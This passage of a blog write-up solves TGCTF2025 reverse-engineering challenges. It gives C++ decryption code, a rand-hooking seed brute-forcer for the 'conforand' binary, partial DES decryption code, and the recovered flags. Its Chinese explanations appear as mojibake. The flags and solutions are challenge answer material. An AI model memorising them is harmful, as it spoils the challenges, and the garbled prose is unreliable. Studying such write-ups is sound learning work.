0101001001100101010101100110010101010010011001010101001101100101</span></span><br><span class="line">    <span class="built_in">srand</span>(<span class="number">2025</span>);</span><br><span class="line">    <span class="type">int</span> RdList[<span class="number">0x80</span>]&#123;&#125;;</span><br><span class="line">    <span class="type">bool</span> v16 = <span class="literal">true</span>;</span><br><span class="line">    <span class="type">int</span> rd&#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            rd = <span class="built_in">rand</span>() % <span class="number">32</span>;</span><br><span class="line">            rd &amp;= <span class="number">0x8000001F</span>;</span><br><span class="line">            v16 = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; i; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (RdList[j] == rd)</span><br><span class="line">                &#123;</span><br><span class="line">                    v16 = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (!v16);</span><br><span class="line">        RdList[i] = rd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> Key[] = <span class="string">&quot;ReVeReSe&quot;</span>;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i += <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        *(DWORD *)(EncFlag + i) ^= Key[count % <span class="number">8</span>];</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> Buffer_Dec[<span class="number">256</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Enc3</span>((<span class="type">int</span> *)inv, (<span class="type">char</span> *)EncFlag, (<span class="type">char</span> *)Buffer_Dec);</span><br><span class="line">    <span class="built_in">Dec2</span>((<span class="type">char</span> *)Buffer_Dec, (<span class="type">char</span> *)Buffer_Dec);</span><br><span class="line">    <span class="built_in">Enc1</span>((<span class="type">char</span> *)Buffer_Dec, RdList);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;HZNUCTF&#123;%.64s&#125;\n&quot;</span>, Buffer_Dec);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HZNUCTF{3zfb899ac5c256d-7a8r59f0tccd-4fa6b8vfd111-a44ffy4r0-6dce5679da58}</p><h2 id="conforandï¼ˆéé¢„æœŸï¼‰"><a href="#conforandï¼ˆéé¢„æœŸï¼‰" class="headerlink" title="conforandï¼ˆéé¢„æœŸï¼‰"></a>conforandï¼ˆéé¢„æœŸï¼‰</h2><p>ä» srand æŸ¥çœ‹äº¤å‰è°ƒç”¨ï¼Œå‘ç°æ˜¯å½“å‰æ—¶é—´æˆ³éšæœºï¼Œå¹¶éä¼ªéšæœºã€‚</p><p><img src="/2025/04/13/TGCTF2025/JO8jbueEjoxwK9xUkGbc8SnBnnd.png"></p><p><img src="/2025/04/13/TGCTF2025/Ke3Gb4w0joy30qxDc4rcyhnHnve.png"></p><p>æŸ¥çœ‹ rand äº¤å‰è°ƒç”¨ï¼Œå‘ç°æ˜¯å† init_sbox å‡½æ•°ä¸­è°ƒç”¨ï¼Œå¹¶ä¸”åªè·å–äº†ä¸€æ¬¡éšæœºæ•°ï¼Œåº”è¯¥æ˜¯åˆ©ç”¨ rand çš„æ•°å€¼å‚ä¸ sbox ç”Ÿæˆã€‚</p><p><img src="/2025/04/13/TGCTF2025/WjGibCMxVoBZZXx1SGNcADoTnQH.png"></p><p>é‚£ä¹ˆè¿™è¾¹çš„æ€è·¯å°±æ˜¯çˆ†ç ´éšæœºæ•°ï¼Œä½†ç”±äºæ˜¯ ollvm ç¼–è¯‘çš„ï¼Œä»£ç æ··ä¹±ï¼Œä½¿ç”¨ d810 å»æ··æ·†åä¹Ÿæ˜¯å¾ˆæ··ä¹±ï¼Œè¿™è¾¹å°±ç›´æ¥ä¸åˆ†æåŠ å¯†ä»£ç ï¼Œé‡‡å–é»‘ç›’çˆ†ç ´æ‰‹æ®µã€‚</p><p>æ¥ä¸‹æ¥æ˜¯å…ˆæ£€éªŒåŠ å¯†å¯¹ç§°æ€§ï¼Œè¿è¡Œå‘ç°æ˜¯ä¼šè¾“å‡ºåŠ å¯†åçš„å†…å®¹ã€‚</p><p>æ£€éªŒæ­¥éª¤ï¼š</p><ol><li>éšä¾¿è¾“å…¥ä¸€ä¸²å­—ç¬¦ä¸²</li><li>æ–­ç‚¹ randï¼Œä¿®æ”¹ rand è¿”å›å€¼ rax å¯„å­˜å™¨ä¸º 0ã€‚</li><li>å¾—åˆ°è¾“å‡ºåŠ å¯†å†…å®¹ã€‚</li><li>å†æ¬¡è¾“å…¥å­—ç¬¦ä¸²ï¼Œæ–­ç‚¹åœ¨ main çš„ rc4 è°ƒç”¨å¤„ï¼Œå°†ä¼ å‚çš„å­—ç¬¦ä¸² patch ä¸ºåˆšåˆšç¨‹åºè¾“å‡ºçš„åŠ å¯†åå­—èŠ‚æ•°æ®ã€‚</li><li>æ–­ç‚¹ randï¼Œä¿®æ”¹ rand è¿”å›å€¼ rax å¯„å­˜å™¨ä¸º 0ã€‚</li><li>è§‚å¯Ÿè¾“å‡ºåŠ å¯†å†…å®¹æ˜¯å¦ä¸ºåŸå­—ç¬¦ä¸²æ•°æ®ã€‚</li></ol><p>Patch å‰ï¼š</p><p><img src="/2025/04/13/TGCTF2025/HTtrb5ro4oKqJmxBK8Sc3IDqncb.png"></p><p>Patch åï¼š</p><p><img src="/2025/04/13/TGCTF2025/ThFobqnWJo9RzvxZFakcsSOdn0b.png"></p><p>å‘ç°æ˜¯å¯¹ç§°çš„ï¼ŒåŒä¸€ä¸ª rand å€¼ï¼ŒåŠ å¯†å‡½æ•°ä¹Ÿå¯ä»¥ç”¨äºè§£å¯†ã€‚</p><p><img src="/2025/04/13/TGCTF2025/RhCobLCqyo4yMKxnDXnc0oXenGb.png"></p><p><img src="/2025/04/13/TGCTF2025/ZOlWb1F05oujnjxbU6EcLE9snmh.png"></p><p>å¼€å§‹ Patch åŸç¨‹åºæµç¨‹ï¼Œç”¨äºçˆ†ç ´ï¼Œå°† init å‡½æ•°ä½œä¸º hook è·³è½¬å‡½æ•°ã€‚</p><p>å°† rand è°ƒç”¨æ”¹æˆ jmp åˆ° init å‡½æ•°ã€‚</p><p><img src="/2025/04/13/TGCTF2025/L5lObHqpPo4BJlxHSL0cU3jfnhg.png"></p><p>init å‡½æ•°å¤´ç›´æ¥æ”¹æˆå¦‚ä¸‹ï¼Œå°† 0x4068D3 åœ°å€çš„æ•°å€¼å­˜åˆ° eaxï¼Œç„¶åå†è·³è½¬å›å»ï¼Œè¾¾åˆ°ä¸€ä¸ª hook ä¿®æ”¹ rand å€¼ç»“æœçš„æ•ˆæœï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥åŠ è½½ elf é€šè¿‡ä¿®æ”¹ 0x4068D3 æ•°å€¼ï¼Œè°ƒç”¨ rc4 åŠ å¯†æ¥çˆ†ç ´è§£å¯†å¯†æ–‡ã€‚</p><p><img src="/2025/04/13/TGCTF2025/Z8d6bu82ToEbmJxAv18cRqsZnZd.png"></p><p>è¿™è¾¹ä½¿ç”¨è¿™ä¸ªåº“åŠ è½½ elf è¿›è¡Œè°ƒç”¨ callï¼š<a href="https://github.com/IchildYu/load-elf">https://github.com/IchildYu/load-elf</a> ï¼ˆæ²³è±šé±¼ï¼Œç¥ï¼‰</p><p>çˆ†ç ´ä»£ç ï¼ˆKey æ˜¯åœ¨åŸ init å‡½æ•°ä¸­è¿›è¡Œåˆå§‹åŒ–çš„æ˜æ–‡ï¼Œå¯ä»¥ç›´æ¥æ‰¾åˆ°ï¼‰ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;include/load_elf.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;include/logger.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;include/breakpoint.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span>* path = <span class="string">&quot;./conforand&quot;</span>;</span><br><span class="line">        <span class="type">void</span>* base = <span class="built_in">load_elf</span>(path);</span><br><span class="line"></span><br><span class="line">        <span class="type">__uint64_t</span>  (*rc4)(<span class="type">unsigned</span> <span class="type">char</span>*, <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">char</span>*, <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) = <span class="built_in">get_symbol_by_offset</span>(base,<span class="number">0x413170</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> key[]=<span class="string">&quot;JustDoIt!&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">1000000</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="type">unsigned</span> <span class="type">char</span> EncData[]=&#123;<span class="number">0x83</span>,<span class="number">0x1e</span>,<span class="number">0x9c</span>,<span class="number">0x48</span>,<span class="number">0x7a</span>,<span class="number">0xfa</span>,<span class="number">0xe8</span>,<span class="number">0x88</span>,<span class="number">0x36</span>,<span class="number">0xd5</span>,<span class="number">0x0a</span>,<span class="number">0x08</span>,<span class="number">0xf6</span>,<span class="number">0xa7</span>,<span class="number">0x70</span>,<span class="number">0x0f</span>,<span class="number">0xfd</span>,<span class="number">0x67</span>,<span class="number">0xdd</span>,<span class="number">0xd4</span>,<span class="number">0x3c</span>,<span class="number">0xa7</span>,<span class="number">0xed</span>,<span class="number">0x8d</span>,<span class="number">0x51</span>,<span class="number">0x10</span>,<span class="number">0xce</span>,<span class="number">0x6a</span>,<span class="number">0x9e</span>,<span class="number">0x56</span>,<span class="number">0x57</span>,<span class="number">0x83</span>,<span class="number">0x56</span>,<span class="number">0xe7</span>,<span class="number">0x67</span>,<span class="number">0x9a</span>,<span class="number">0x67</span>,<span class="number">0x22</span>,<span class="number">0x24</span>,<span class="number">0x6e</span>,<span class="number">0xcd</span>,<span class="number">0x2f</span>&#125;;</span><br><span class="line"></span><br><span class="line">                *(<span class="type">unsigned</span> <span class="type">int</span>*)(<span class="number">0x4068D3</span>) = i;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">rc4</span>(EncData,<span class="number">42</span>,key,<span class="number">9</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(EncData[<span class="number">0</span>] == <span class="string">&#x27;H&#x27;</span> </span><br><span class="line">                        &amp;&amp; EncData[<span class="number">1</span>] == <span class="string">&#x27;Z&#x27;</span></span><br><span class="line">                        &amp;&amp; EncData[<span class="number">2</span>] == <span class="string">&#x27;N&#x27;</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;Seed:%d\n&quot;</span>,i);</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;%.42s\n&quot;</span>,EncData);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/04/13/TGCTF2025/OnhobJQFKoZ69oxRCQycK3OZnCh.png"></p><p>HZNUCTF{489b88-1305-411e-b1f4-88a3070a73}</p><h2 id="exchange"><a href="#exchange" class="headerlink" title="exchange"></a>exchange</h2><p>è¾“å…¥çš„å­—ç¬¦ä¸²ç»è¿‡ unhexã€æ‹†åˆ†å­—èŠ‚ï¼Œæ”¹å˜é¡ºåºã€‚</p><p>å¦‚ï¼š<strong>11</strong>-&gt;<strong>0x31 0x31</strong>-&gt;<strong>â€˜3â€™ â€˜1â€™ â€˜3â€™ â€˜1â€™</strong>-&gt;<strong>â€˜3â€™ â€˜3â€™ â€˜1â€™ â€˜1â€™</strong></p><p>æ˜¯ä¸¤ä¸ªå­—èŠ‚ä¸ºä¸€ç»„è¿›è¡Œå˜æ¢çš„ã€‚</p><p>ç„¶åè°ƒç”¨äº†åŠ å¯†å‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¼ å…¥å˜æ¢åçš„è¾“å…¥ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯â€HZNUCTF{â€œå­—ä¸²ã€‚</p><p><img src="/2025/04/13/TGCTF2025/IpzebVjiWokSsPxbqbvcFPuqnpc.png"></p><p>ä¸»åŠ å¯†å‡½æ•°ï¼Œå‘ç°åªèµ°è¿™ä¸Šé¢çš„éƒ¨åˆ†ã€‚</p><p><img src="/2025/04/13/TGCTF2025/V80kbgNWwoxANlxB4YMcWunPnhb.png"></p><p>ç¬¬ä¸€ä¸ªå‡½æ•°æ˜¯ç”¨â€HZNUCTF{â€œå­—ä¸²ç”Ÿæˆçš„ä¸€ä¸²æ•°æ®ï¼Œ64 ä¸ªæ•´æ•°æ•°æ®ã€‚</p><p>ç¬¬äºŒä¸ªå‡½æ•°æ˜¯å°†è¾“å…¥æ•°æ® 8 ä¸ªå­—èŠ‚ä¸ºä¸€ç»„è¿›è¡ŒåŠ å¯†ã€‚</p><p>åŠ å¯†æµç¨‹ï¼š</p><ol><li>4 ä¸ªå­—èŠ‚ä¸ºä¸€ç»„è¿›è¡Œç¿»è½¬</li><li>8 å­—èŠ‚åŠ å¯†</li><li>4 ä¸ªå­—èŠ‚ä¸ºä¸€ç»„è¿›è¡Œç¿»è½¬</li></ol><p><img src="/2025/04/13/TGCTF2025/Li3ibSsH4oXPrgxpuE1cXiC3nWf.png"></p><p>åŠ å¯†å¯ä»¥çœ‹å‡ºæ˜¯ DES åŠ å¯†ç®—æ³•ï¼Œæ˜¯å¯¹ç§°çš„ï¼Œkey å°±æ˜¯åˆšåˆšç”Ÿæˆçš„ 64 ä¸ªæ•´æ•°æ•°å€¼çš„å‰ 32 ä¸ªï¼Œé‚£ä¹ˆå¯ä»¥çŸ¥é“å 32 ä¸ªå°±æ˜¯è§£å¯†ç”¨çš„ keyï¼Œç›´æ¥ copy è¯¥å‡½æ•°ï¼Œè§£å¯†æ—¶ç”¨ç”Ÿæˆçš„å 32 ä¸ªæ•´æ•° key å³å¯è§£å¯†ã€‚</p><p><img src="/2025/04/13/TGCTF2025/S3IQbDNbQoHoZAxTqEycpqhpnJf.png"></p><p>è§£å¯†ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s1[<span class="number">64</span>] = &#123;</span><br><span class="line">    <span class="number">0x01010400</span>, <span class="number">0x00000000</span>, <span class="number">0x00010000</span>, <span class="number">0x01010404</span>, <span class="number">0x01010004</span>, <span class="number">0x00010404</span>, <span class="number">0x00000004</span>, <span class="number">0x00010000</span>,</span><br><span class="line">    <span class="number">0x00000400</span>, <span class="number">0x01010400</span>, <span class="number">0x01010404</span>, <span class="number">0x00000400</span>, <span class="number">0x01000404</span>, <span class="number">0x01010004</span>, <span class="number">0x01000000</span>, <span class="number">0x00000004</span>,</span><br><span class="line">    <span class="number">0x00000404</span>, <span class="number">0x01000400</span>, <span class="number">0x01000400</span>, <span class="number">0x00010400</span>, <span class="number">0x00010400</span>, <span class="number">0x01010000</span>, <span class="number">0x01010000</span>, <span class="number">0x01000404</span>,</span><br><span class="line">    <span class="number">0x00010004</span>, <span class="number">0x01000004</span>, <span class="number">0x01000004</span>, <span class="number">0x00010004</span>, <span class="number">0x00000000</span>, <span class="number">0x00000404</span>, <span class="number">0x00010404</span>, <span class="number">0x01000000</span>,</span><br><span class="line">    <span class="number">0x00010000</span>, <span class="number">0x01010404</span>, <span class="number">0x00000004</span>, <span class="number">0x01010000</span>, <span class="number">0x01010400</span>, <span class="number">0x01000000</span>, <span class="number">0x01000000</span>, <span class="number">0x00000400</span>,</span><br><span class="line">    <span class="number">0x01010004</span>, <span class="number">0x00010000</span>, <span class="number">0x00010400</span>, <span class="number">0x01000004</span>, <span class="number">0x00000400</span>, <span class="number">0x00000004</span>, <span class="number">0x01000404</span>, <span class="number">0x00010404</span>,</span><br><span class="line">    <span class="number">0x01010404</span>, <span class="number">0x00010004</span>, <span class="number">0x01010000</span>, <span class="number">0x01000404</span>, <span class="number">0x01000004</span>, <span class="number">0x00000404</span>, <span class="number">0x00010404</span>, <span class="number">0x01010400</span>,</span><br><span class="line">    <span class="number">0x00000404</span>, <span class="number">0x01000400</span>, <span class="number">0x01000400</span>, <span class="number">0x00000000</span>, <span class="number">0x00010004</span>, <span class="number">0x00010400</span>, <span class="number">0x00000000</span>, <span class="number">0x01010004</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s2[<span class="number">64</span>] = &#123;</span><br><span class="line">    <span class="number">0x80108020</span>, <span class="number">0x80008000</span>, <span class="number">0x00008000</span>, <span class="number">0x00108020</span>, <span class="number">0x00100000</span>, <span class="number">0x00000020</span>, <span class="number">0x80100020</span>, <span class="number">0x80008020</span>,</span><br><span class="line">    <span class="number">0x80000020</span>, <span class="number">0x80108020</span>, <span class="number">0x80108000</span>, <span class="number">0x80000000</span>, <span class="number">0x80008000</span>, <span class="number">0x00100000</span>, <span class="number">0x00000020</span>, <span class="number">0x80100020</span>,</span><br><span class="line">    <span class="number">0x00108000</span>, <span class="number">0x00100020</span>, <span class="number">0x80008020</span>, <span class="number">0x00000000</span>, <span class="number">0x80000000</span>, <span class="number">0x00008000</span>, <span class="number">0x00108020</span>, <span class="number">0x80100000</span>,</span><br><span class="line">    <span class="number">0x00100020</span>, <span class="number">0x80000020</span>, <span class="number">0x00000000</span>, <span class="number">0x00108000</span>, <span class="number">0x00008020</span>, <span class="number">0x80108000</span>, <span class="number">0x80100000</span>, <span class="number">0x00008020</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x00108020</span>, <span class="number">0x80100020</span>, <span class="number">0x00100000</span>, <span class="number">0x80008020</span>, <span class="number">0x80100000</span>, <span class="number">0x80108000</span>, <span class="number">0x00008000</span>,</span><br><span class="line">    <span class="number">0x80100000</span>, <span class="number">0x80008000</span>, <span class="number">0x00000020</span>, <span class="number">0x80108020</span>, <span class="number">0x00108020</span>, <span class="number">0x00000020</span>, <span class="number">0x00008000</span>, <span class="number">0x80000000</span>,</span><br><span class="line">    <span class="number">0x00008020</span>, <span class="number">0x80108000</span>, <span class="number">0x00100000</span>, <span class="number">0x80000020</span>, <span class="number">0x00100020</span>, <span class="number">0x80008020</span>, <span class="number">0x80000020</span>, <span class="number">0x00100020</span>,</span><br><span class="line">    <span class="number">0x00108000</span>, <span class="number">0x00000000</span>, <span class="number">0x80008000</span>, <span class="number">0x00008020</span>, <span class="number">0x80000000</span>, <span class="number">0x80100020</span>, <span class="number">0x80108020</span>, <span class="number">0x00108000</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s3[<span class="number">64</span>] = &#123;</span><br><span class="line">    <span class="number">0x00000208</span>, <span class="number">0x08020200</span>, <span class="number">0x00000000</span>, <span class="number">0x08020008</span>, <span class="number">0x08000200</span>, <span class="number">0x00000000</span>, <span class="number">0x00020208</span>, <span class="number">0x08000200</span>,</span><br><span class="line">    <span class="number">0x00020008</span>, <span class="number">0x08000008</span>, <span class="number">0x08000008</span>, <span class="number">0x00020000</span>, <span class="number">0x08020208</span>, <span class="number">0x00020008</span>, <span class="number">0x08020000</span>, <span class="number">0x00000208</span>,</span><br><span class="line">    <span class="number">0x08000000</span>, <span class="number">0x00000008</span>, <span class="number">0x08020200</span>, <span class="number">0x00000200</span>, <span class="number">0x00020200</span>, <span class="number">0x08020000</span>, <span class="number">0x08020008</span>, <span class="number">0x00020208</span>,</span><br><span class="line">    <span class="number">0x08000208</span>, <span class="number">0x00020200</span>, <span class="number">0x00020000</span>, <span class="number">0x08000208</span>, <span class="number">0x00000008</span>, <span class="number">0x08020208</span>, <span class="number">0x00000200</span>, <span class="number">0x08000000</span>,</span><br><span class="line">    <span class="number">0x08020200</span>, <span class="number">0x08000000</span>, <span class="number">0x00020008</span>, <span class="number">0x00000208</span>, <span class="number">0x00020000</span>, <span class="number">0x08020200</span>, <span class="number">0x08000200</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000200</span>, <span class="number">0x00020008</span>, <span class="number">0x08020208</span>, <span class="number">0x08000200</span>, <span class="number">0x08000008</span>, <span class="number">0x00000200</span>, <span class="number">0x00000000</span>, <span class="number">0x08020008</span>,</span><br><span class="line">    <span class="number">0x08000208</span>, <span class="number">0x00020000</span>, <span class="number">0x08000000</span>, <span class="number">0x08020208</span>, <span class="number">0x00000008</span>, <span class="number">0x00020208</span>, <span class="number">0x00020200</span>, <span class="number">0x08000008</span>,</span><br><span class="line">    <span class="number">0x08020000</span>, <span class="number">0x08000208</span>, <span class="number">0x00000208</span>, <span class="number">0x08020000</span>, <span class="number">0x00020208</span>, <span class="number">0x00000008</span>, <span class="number">0x08020008</span>, <span class="number">0x00020200</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s4[<span class="number">64</span>] = &#123;</span><br><span class="line">    <span class="number">0x00802001</span>, <span class="number">0x00002081</span>, <span class="number">0x00002081</span>, <span class="number">0x00000080</span>, <span class="number">0x00802080</span>, <span class="number">0x00800081</span>, <span class="number">0x00800001</span>, <span class="number">0x00002001</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x00802000</span>, <span class="number">0x00802000</span>, <span class="number">0x00802081</span>, <span class="number">0x00000081</span>, <span class="number">0x00000000</span>, <span class="number">0x00800080</span>, <span class="number">0x00800001</span>,</span><br><span class="line">    <span class="number">0x00000001</span>, <span class="number">0x00002000</span>, <span class="number">0x00800000</span>, <span class="number">0x00802001</span>, <span class="number">0x00000080</span>, <span class="number">0x00800000</span>, <span class="number">0x00002001</span>, <span class="number">0x00002080</span>,</span><br><span class="line">    <span class="number">0x00800081</span>, <span class="number">0x00000001</span>, <span class="number">0x00002080</span>, <span class="number">0x00800080</span>, <span class="number">0x00002000</span>, <span class="number">0x00802080</span>, <span class="number">0x00802081</span>, <span class="number">0x00000081</span>,</span><br><span class="line">    <span class="number">0x00800080</span>, <span class="number">0x00800001</span>, <span class="number">0x00802000</span>, <span class="number">0x00802081</span>, <span class="number">0x00000081</span>, <span 